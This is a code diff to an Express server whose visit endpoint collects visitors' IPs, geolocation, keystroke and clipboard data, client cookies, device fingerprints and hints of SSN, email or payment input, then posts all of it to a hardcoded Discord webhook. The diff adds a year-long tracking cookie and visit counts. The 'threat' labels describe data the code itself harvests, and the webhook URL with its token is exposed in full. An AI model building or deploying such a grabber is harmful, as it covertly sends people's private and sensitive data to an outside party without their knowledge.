@@ -23,6 +23,29 @@ const logger = winston.createLogger({
   ]
 });
 
+const visitorsFile = path.join(__dirname, 'visitors.json');
+
+async function loadVisitors() {
+  try {
+    const data = await fs.readFile(visitorsFile, 'utf8');
+    return JSON.parse(data);
+  } catch (err) {
+    if (err.code === 'ENOENT') {
+      return {};
+    }
+    logger.error('Error loading visitors file', { error: err.message });
+    return {};
+  }
+}
+
+async function saveVisitors(visitors) {
+  try {
+    await fs.writeFile(visitorsFile, JSON.stringify(visitors, null, 2));
+  } catch (err) {
+    logger.error('Error saving visitors file', { error: err.message });
+  }
+}
+
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000,
   max: 100,
@@ -187,133 +210,152 @@ function detectSecurityThreats(req, visitorInfo) {
   if (req.body.part4?.inlineScripts?.length || req.body.part4?.cookieAccess) {
     threats.push({
       type: 'XSS',
-      details: `Detected ${req.body.part4?.inlineScripts?.length || 0} inline scripts and cookie access: ${req.body.part4?.cookieAccess}`
+      details: `Detected ${req.body.part4?.inlineScripts?.length || 0} inline scripts and cookie access: ${req.body.part4?.cookieAccess}`,
+      category: 'part4'
     });
   }
 
   if ((req.headers['referer'] || req.body.part1?.referrer)?.includes('token=') || (req.headers['referer'] || req.body.part1?.referrer)?.includes('auth=')) {
     threats.push({
       type: 'Referrer Leakage',
-      details: `Sensitive data in referrer: ${req.headers['referer'] || req.body.part1?.referrer}`
+      details: `Sensitive data in referrer: ${req.headers['referer'] || req.body.part1?.referrer}`,
+      category: 'part1'
     });
   }
 
   if (!req.body.part1?.referrer && !req.headers['referer']) {
     threats.push({
       type: 'Missing Referrer',
-      details: 'No referrer provided by client or server'
+      details: 'No referrer provided by client or server',
+      category: 'part1'
     });
   }
 
   if ((req.body.part1?.referrer === 'Unknown (Invalid Referrer)' || req.headers['referer'] === 'Unknown (Invalid Server Referrer)') && req.body.part1?.referrer !== 'Direct') {
     threats.push({
       type: 'Invalid Referrer',
-      details: 'Malformed or unparsable referrer detected'
+      details: 'Malformed or unparsable referrer detected',
+      category: 'part1'
     });
   }
 
   if (req.body.part4?.thirdPartyRequests?.length) {
     threats.push({
       type: 'Cookie Syncing',
-      details: `Third-party requests to: ${req.body.part4?.thirdPartyRequests.join(', ')}`
+      details: `Third-party requests to: ${req.body.part4?.thirdPartyRequests.join(', ')}`,
+      category: 'part4'
     });
   }
 
   if (req.cookies && Object.values(req.cookies).some(value => value.includes('.'))) {
     threats.push({
       type: 'Subdomain Cookie Scope Abuse',
-      details: 'Broad cookie value detected'
+      details: 'Broad cookie value detected',
+      category: 'part2'
     });
   }
 
   if (req.cookies && Object.keys(req.cookies).length > 0 && Object.values(req.cookies).some(value => value.length > 100 || value.includes('session') || value.includes('token'))) {
     threats.push({
       type: 'Suspicious Cookie Content',
-      details: `Potentially sensitive or oversized cookies detected: ${JSON.stringify(Object.keys(req.cookies))}`
+      details: `Potentially sensitive or oversized cookies detected: ${JSON.stringify(Object.keys(req.cookies))}`,
+      category: 'part2'
     });
   }
 
   if (!req.secure && process.env.NODE_ENV === 'production') {
     threats.push({
       type: 'MITM Risk',
-      details: 'Insecure HTTP connection detected'
+      details: 'Insecure HTTP connection detected',
+      category: 'part2'
     });
   }
 
   if (req.body.part4?.postMessageCalls?.length) {
     threats.push({
       type: 'PostMessage Misuse',
-      details: `Unverified postMessage calls: ${req.body.part4?.postMessageCalls.join(', ')}`
+      details: `Unverified postMessage calls: ${req.body.part4?.postMessageCalls.join(', ')}`,
+      category: 'part4'
     });
   }
 
   if (req.body.part3?.keystrokes && req.body.part3.keystrokes.includes('password')) {
     threats.push({
       type: 'Sensitive Keylogging',
-      details: 'Potentially sensitive data detected in keystrokes'
+      details: 'Potentially sensitive data detected in keystrokes',
+      category: 'part3'
     });
   }
 
   if (req.body.part3?.clipboardAccess !== 'None') {
     threats.push({
       type: 'Clipboard Access',
-      details: `Clipboard interaction detected: ${req.body.part3.clipboardAccess}`
+      details: `Clipboard interaction detected: ${req.body.part3.clipboardAccess}`,
+      category: 'part3'
     });
   }
 
   if (req.body.part3?.ssnPatternDetected !== 'None') {
     threats.push({
       type: 'SSN Pattern',
-      details: 'SSN-like pattern detected in input'
+      details: 'SSN-like pattern detected in input',
+      category: 'part3'
     });
   }
 
   if (req.body.part3?.emailPatternDetected !== 'None') {
     threats.push({
       type: 'Email Pattern',
-      details: 'Email-like pattern detected in input'
+      details: 'Email-like pattern detected in input',
+      category: 'part3'
     });
   }
 
   if (req.body.part3?.paymentFieldInteraction !== 'None') {
     threats.push({
       type: 'Payment Field Interaction',
-      details: 'Input detected in payment-related field'
+      details: 'Input detected in payment-related field',
+      category: 'part3'
     });
   }
 
   if (req.body.part3?.utmParameters && JSON.parse(req.body.part3.utmParameters || '{}').utm_source?.includes('token')) {
     threats.push({
       type: 'Suspicious UTM Parameter',
-      details: 'Potential sensitive data in UTM parameters'
+      details: 'Potential sensitive data in UTM parameters',
+      category: 'part3'
     });
   }
 
   if (req.body.part3?.eventLog?.includes('password') || req.body.part3?.eventLog?.includes('card') || req.body.part3?.eventLog?.includes('ssn')) {
     threats.push({
       type: 'Sensitive Event',
-      details: 'Potentially sensitive data in event log'
+      details: 'Potentially sensitive data in event log',
+      category: 'part3'
     });
   }
 
   if (req.body.part4?.clientCookies && (req.body.part4.clientCookies.includes('token') || req.body.part4.clientCookies.includes('session'))) {
     threats.push({
       type: 'Sensitive Client Cookies',
-      details: 'Potentially sensitive data in client-sent cookies'
+      details: 'Potentially sensitive data in client-sent cookies',
+      category: 'part4'
     });
   }
 
   if (req.body.part4?.localStorageUsage > 0) {
     threats.push({
       type: 'Local Storage Monitoring',
-      details: `Local storage usage detected: ${req.body.part4.localStorageUsage} bytes`
+      details: `Local storage usage detected: ${req.body.part4.localStorageUsage} bytes`,
+      category: 'part4'
     });
   }
 
   if (req.body.part1?.location !== 'Unknown' && req.body.part1?.location.latitude === 0 && req.body.part1?.location.longitude === 0) {
     threats.push({
       type: 'Suspicious Location',
-      details: 'Device location coordinates (0, 0) detected'
+      details: 'Device location coordinates (0, 0) detected',
+      category: 'part1'
     });
   }
 
@@ -344,7 +386,30 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
     const plugins = req.body.part3?.plugins ? Array.isArray(req.body.part3.plugins) ? req.body.part3.plugins : [] : [];
     const mimeTypes = req.body.part3?.mimeTypes ? Array.isArray(req.body.part3.mimeTypes) ? req.body.part3.mimeTypes : [] : [];
 
+    let visitorId = req.cookies.visitorId;
+    if (!visitorId) {
+      visitorId = uuidv4();
+      res.cookie('visitorId', visitorId, {
+        maxAge: 365 * 24 * 60 * 60 * 1000,
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: process.env.NODE_ENV === 'production' ? 'None' : 'Lax'
+      });
+    }
+
+    const visitors = await loadVisitors();
+    let visitorData = visitors[visitorId] || { count: 0, lastVisit: null };
+    const currentVisit = new Date().toISOString();
+    const lastVisit = visitorData.lastVisit || 'First Visit';
+    const visitCount = visitorData.count + 1;
+    visitorData = { count: visitCount, lastVisit: currentVisit };
+    visitors[visitorId] = visitorData;
+    await saveVisitors(visitors);
+
     const visitorInfo = {
+      visitorId: visitorId,
+      visitCount: visitCount,
+      lastVisit: lastVisit,
       sessionId: req.sessionId,
       ip: geoData.query,
       allIPs: ipInfo.all,
@@ -361,7 +426,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       proxy: geoData.proxy,
       hosting: geoData.hosting,
       device: req.body.part1?.device || 'Unknown',
-      timestamp: req.body.part1?.timestamp || new Date().toISOString(),
+      timestamp: req.body.part1?.timestamp || currentVisit,
       browser: agent.toAgent(),
       os: agent.os.toString(),
       deviceType: agent.device.toString(),
@@ -414,7 +479,6 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
         clientCookies: req.body.part4?.clientCookies || 'None',
         localStorageUsage: req.body.part4?.localStorageUsage || 'Unknown',
         localIP: req.body.part4?.localIP || 'Unknown',
-        canvasFingerprint: req.body.part4?.canvasFingerprint || 'None',
         audioFingerprint: req.body.part4?.audioFingerprint || 'None'
       }
     };
@@ -426,9 +490,29 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
 
     logger.info('Visitor Info', { ...visitorInfo, threats });
 
+    const threatsByPart = {
+      part1: threats.filter(t => t.category === 'part1'),
+      part2: threats.filter(t => t.category === 'part2'),
+      part3: threats.filter(t => t.category === 'part3'),
+      part4: threats.filter(t => t.category === 'part4' || !t.category)
+    };
+
+    const getColor = (partThreats, totalThreats) => {
+      if (partThreats.length > 0) {
+        return 0xff0000; // red
+      } else if (totalThreats > 0) {
+        return 0xffa500; // orange
+      } else {
+        return 0x00ff00; // green
+      }
+    };
+
     const webhookURL = 'https://ptb.discord.com/api/webhooks/1423009299826868396/7ezGh2CAQRooHIvE5sXCBGW0AAgFE2Ku8aFqUDe2eqC2BG7quehvy6JBgWqSwfhrROAq';
 
     const fields = [
+      { name: 'Visitor ID', value: visitorInfo.visitorId, inline: true },
+      { name: 'Visit Count', value: visitorInfo.visitCount.toString(), inline: true },
+      { name: 'Last Visit', value: visitorInfo.lastVisit, inline: true },
       { name: 'Session ID', value: visitorInfo.sessionId, inline: true },
       { name: 'IP', value: visitorInfo.ip, inline: true },
       { name: 'All IPs', value: visitorInfo.allIPs.join(', ') || 'N/A', inline: true },
@@ -480,20 +564,21 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Client Cookies', value: visitorInfo.part4.clientCookies, inline: true },
       { name: 'Local Storage Usage', value: visitorInfo.part4.localStorageUsage, inline: true },
       { name: 'Local IP', value: visitorInfo.part4.localIP, inline: true },
-      { name: 'Canvas Fingerprint', value: visitorInfo.part4.canvasFingerprint, inline: true },
       { name: 'Audio Fingerprint', value: visitorInfo.part4.audioFingerprint, inline: true },
-      { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
+      { name: 'Threats', value: threats.length ? threats.map(t => `**${t.type}**: ${t.details}`).join('\n') : 'None', inline: false }
     ];
 
-    const part1 = fields.slice(0, 15);
-    const part2 = fields.slice(15, 30);
-    const part3 = fields.slice(30, 45);
-    const part4 = fields.slice(45);
+    const part1 = fields.slice(0, 18);
+    const part2 = fields.slice(18, 33);
+    const part3 = fields.slice(33, 48);
+    const part4 = fields.slice(48);
+
+    const totalThreats = threats.length;
 
     const payload1 = {
       embeds: [{
         title: 'New Visitor Detected! (Part 1 - Critical Info)',
-        color: threats.length ? 0xff0000 : 0x00ff00,
+        color: getColor(threatsByPart.part1, totalThreats),
         timestamp: visitorInfo.timestamp,
         fields: part1
       }]
@@ -502,7 +587,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
     const payload2 = {
       embeds: [{
         title: 'New Visitor Detected! (Part 2 - Device Details)',
-        color: threats.length ? 0xff0000 : 0x00ff00,
+        color: getColor(threatsByPart.part2, totalThreats),
         timestamp: visitorInfo.timestamp,
         fields: part2
       }]
@@ -511,7 +596,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
     const payload3 = {
       embeds: [{
         title: 'New Visitor Detected! (Part 3 - Interactions)',
-        color: threats.length ? 0xff0000 : 0x00ff00,
+        color: getColor(threatsByPart.part3, totalThreats),
         timestamp: visitorInfo.timestamp,
         fields: part3
       }]
@@ -520,7 +605,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
     const payload4 = {
       embeds: [{
         title: 'New Visitor Detected! (Part 4 - Fingerprints & Threats)',
-        color: threats.length ? 0xff0000 : 0x00ff00,
+        color: getColor(threatsByPart.part4, totalThreats),
         timestamp: visitorInfo.timestamp,
         fields: part4
       }]
